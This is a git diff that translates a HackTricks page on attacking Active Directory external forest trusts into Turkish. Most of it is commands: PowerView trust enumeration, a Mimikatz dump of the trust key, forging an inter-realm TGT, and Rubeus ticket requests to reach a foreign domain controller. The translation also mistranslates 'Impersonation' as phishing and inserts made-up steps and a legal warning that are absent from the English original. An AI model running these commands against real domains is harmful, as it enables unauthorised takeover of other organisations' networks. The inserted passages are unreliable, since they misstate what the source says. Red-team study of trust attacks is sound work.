@@ -1,37 +1,36 @@
-# External Forest Domain - OneWay (Inbound) or bidirectional
+# Harici Orman Alanı - Tek Yönlü (Gelen) veya çift yönlü
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
+* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
 
 </details>
 
-In this scenario an external domain is trusting you (or both are trusting each other), so you can get some kind of access over it.
+Bu senaryoda harici bir etki alanı size güveniyor (veya ikisi birbirine güveniyor), bu yüzden onun üzerinde bir tür erişim elde edebilirsiniz.
 
-## Enumeration
+## Sıralama
 
-First of all, you need to **enumerate** the **trust**:
-
+Öncelikle, **güveni** **sıralamanız** gerekmektedir:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
 TargetName      : domain.external  --> Destination domain
 TrustType       : WINDOWS-ACTIVE_DIRECTORY
-TrustAttributes : 
+TrustAttributes :
 TrustDirection  : Inbound          --> Inboud trust
 WhenCreated     : 2/19/2021 10:50:56 PM
 WhenChanged     : 2/19/2021 10:50:56 PM
 
 # Get name of DC of the other domain
 Get-DomainComputer -Domain domain.external -Properties DNSHostName
-dnshostname           
------------           
+dnshostname
+-----------
 dc.domain.external
 
 # Groups that contain users outside of its domain and return its members
@@ -42,7 +41,7 @@ GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
 MemberDomain            : domain.external
 MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
 MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
-                          DC=external
+DC=external
 
 # Get name of the principal in the current domain member of the cross-domain group
 ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
@@ -64,52 +63,41 @@ SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
 IsGroup      : True
 IsDomain     : True
 
-# You may also enumerate where foreign groups and/or users have been assigned 
+# You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
+Önceki numaralandırmada, **`crossuser`** kullanıcısının **`External Admins`** grubunda olduğu ve **dış etki alanının DC'sinde** **Yönetici erişimi** olduğu bulundu.
 
-In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
+## İlk Erişim
 
-## Initial Access
+Eğer diğer etki alanında kullanıcınızın herhangi bir **özel** erişimini **bulamadıysanız**, hala AD Metodolojisine geri dönüp **bir ayrıcalıksız kullanıcıdan ayrıcalık yükseltme** deneyebilirsiniz (örneğin kerberoasting gibi):
 
-If you **couldn't** find any **special** access of your user in the other domain, you can still go back to the AD Methodology and try to **privesc from an unprivileged user** (things like kerberoasting for example):
-
-You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
-
+**Powerview fonksiyonlarını** kullanarak `-Domain` parametresini kullanarak **diğer etki alanını** numaralandırabilirsiniz:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
+## Kimlik avı
 
-{% content-ref url="./" %}
-[.](./)
-{% endcontent-ref %}
+### Giriş yapma
 
-## Impersonation
-
-### Logging in
-
-Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
-
+Dış etki alanına erişimi olan kullanıcıların kimlik bilgileriyle düzenli bir yöntem kullanarak erişim sağlayabilirsiniz:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
+### SID Geçmişi Kötüye Kullanımı
 
-### SID History Abuse
+Ayrıca, bir ormanda güven ilişkisi üzerinden [**SID Geçmişi**](sid-history-injection.md) kötüye kullanılabilir.
 
-You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.
-
-If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.
+Bir kullanıcı **bir ormandan başka bir ormana** taşındığında ve **SID Filtreleme etkin değilse**, diğer ormandan bir **SID eklemek mümkün** hale gelir ve bu **SID**, güven ilişkisi üzerinden kimlik doğrulama yapılırken kullanıcının **token'ına eklenir**.
 
 {% hint style="warning" %}
-As a reminder, you can get the signing key with
-
+Hatırlatma olarak, imzalama anahtarını aşağıdaki komutla alabilirsiniz:
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-You could **sign with** the **trusted** key a **TGT impersonating** the user of the current domain.
-
+Mevcut alanın kullanıcısını taklit eden bir TGT'yi **güvenilir** anahtarla **imzalayabilirsiniz**.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -120,9 +108,17 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
+### Kullanıcıyı taklit etmek için tam yol
 
-### Full way impersonating the user
+Bu yöntem, bir kullanıcının kimliğini taklit etmek için kullanılır. Aşağıdaki adımları izleyerek bu yöntemi uygulayabilirsiniz:
 
+1. İlk olarak, hedef kullanıcının kimlik bilgilerini elde etmeniz gerekmektedir. Bu bilgiler, kullanıcının kullanıcı adı ve parolasını içerir.
+
+2. Ardından, hedef kullanıcının kimlik bilgilerini kullanarak oturum açmanız gerekmektedir. Bu, hedef kullanıcının hesabına erişim sağlayacaktır.
+
+3. Oturum açtıktan sonra, hedef kullanıcının kimliğini taklit etmek için bir dizi yöntem kullanabilirsiniz. Örneğin, hedef kullanıcının e-posta hesabına erişebilir, sosyal medya hesaplarını kontrol edebilir veya diğer çevrimiçi platformlarda onun adına işlemler gerçekleştirebilirsiniz.
+
+Bu yöntem, hedef kullanıcının kimliğini taklit etmek için kullanılan bir dizi teknik içerir. Ancak, bu tür bir etkinlik yasa dışıdır ve başkalarının gizliliğini ihlal etmektedir. Bu nedenle, bu tür bir faaliyeti gerçekleştirmek yasal sonuçlar doğurabilir ve ciddi cezalara yol açabilir. Bu nedenle, bu tür faaliyetlerden kaçınmanız önemlidir.
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -136,15 +132,14 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Bir **cybersecurity şirketinde çalışıyor musunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Hacking hilelerinizi [hacktricks repo'ya](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo'ya](https://github.com/carlospolop/hacktricks-cloud) PR göndererek paylaşın**.
 
 </details>
